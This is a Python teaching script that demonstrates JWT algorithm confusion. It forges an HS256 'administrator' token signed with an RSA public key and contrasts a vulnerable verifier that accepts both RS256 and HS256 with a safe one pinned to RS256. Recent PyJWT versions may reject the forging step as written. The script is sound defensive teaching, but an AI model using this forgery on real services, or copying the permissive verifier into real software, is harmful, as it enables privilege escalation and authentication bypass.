#!/usr/bin/env python3
"""Minimal, self-contained demo of JWT algorithm confusion.

Generates an RSA key pair, mints a legitimate RS256 token, then forges an
HS256 token using the RSA PUBLIC key PEM as the HMAC secret. It shows:

  * a verifier that allows both RS256 and HS256 ACCEPTS the forgery (vulnerable)
  * a verifier pinned to RS256 only REJECTS the forgery (safe)

No lab, no network. Run it to see the bug and its fix in one output.

    pip install pyjwt cryptography
    python3 -I demo/vuln_vs_safe.py
"""
import jwt  # PyJWT
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa


def make_keypair():
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    private_pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption(),
    )
    public_pem = private_key.public_key().public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )
    return private_pem, public_pem


def main() -> int:
    private_pem, public_pem = make_keypair()

    # 1. Legitimate RS256 token, signed with the PRIVATE key.
    legit = jwt.encode({"sub": "wiener"}, private_pem, algorithm="RS256")
    print("Legitimate RS256 token (sub=wiener):")
    print(f"  {legit}\n")

    # 2. Forged HS256 token: HMAC-signed with the PUBLIC key PEM as the secret.
    #    The attacker only has the public key — and that is enough.
    forged = jwt.encode(
        {"sub": "administrator"},
        public_pem,              # public key bytes used as an HMAC secret
        algorithm="HS256",
    )
    print("Forged HS256 token (sub=administrator), signed with the PUBLIC key:")
    print(f"  {forged}\n")

    # 3. VULNERABLE verifier: accepts both RS256 and HS256.
    print("[VULNERABLE] verifier allows algorithms=['RS256','HS256']:")
    try:
        claims = jwt.decode(forged, public_pem, algorithms=["RS256", "HS256"])
        print(f"  ACCEPTED forgery -> sub={claims['sub']!r}  <-- privilege escalation\n")
    except jwt.InvalidTokenError as exc:
        print(f"  rejected: {exc}\n")

    # 4. SAFE verifier: pinned to RS256 only.
    print("[SAFE] verifier allows algorithms=['RS256'] only:")
    try:
        claims = jwt.decode(forged, public_pem, algorithms=["RS256"])
        print(f"  ACCEPTED forgery -> sub={claims['sub']!r}  (should not happen)\n")
    except jwt.InvalidTokenError as exc:
        print(f"  REJECTED forgery: {exc}\n")

    # 5. Sanity: the safe verifier still accepts the legitimate token.
    claims = jwt.decode(legit, public_pem, algorithms=["RS256"])
    print(f"[SAFE] legitimate RS256 token still verifies -> sub={claims['sub']!r}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
